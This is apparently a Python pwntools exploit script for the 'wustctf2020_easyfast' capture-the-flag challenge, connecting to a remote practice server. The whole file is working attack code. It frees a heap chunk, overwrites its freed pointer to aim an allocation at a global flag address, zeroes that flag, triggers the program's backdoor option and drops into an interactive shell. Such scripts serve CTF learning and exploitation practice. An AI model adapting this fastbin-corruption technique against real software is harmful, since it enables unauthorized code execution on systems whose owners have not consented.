from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('wustctf2020_easyfast')
io = remote('node4.buuoj.cn', 29925)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('wustctf2020_easyfast')
backdoor_flag = 0x602090

def add(size):
    io.sendlineafter('choice>\n', '1')
    io.sendlineafter('size>\n', str(size))


def delete(index):
    io.sendlineafter('choice>\n', '2')
    io.sendlineafter('index>\n', str(index))


def edit(index, content):
    io.sendlineafter('choice>\n', '3')
    io.sendlineafter('index>\n', str(index))
    io.send(content)


def pwn():
    add(0x40)
    delete(0)
    edit(0, p64(backdoor_flag - 0x10))
    add(0x40)
    add(0x40)
    edit(2, p64(0))
    io.sendlineafter('choice>\n', '4')
    io.interactive()


if __name__ == '__main__':
    pwn()
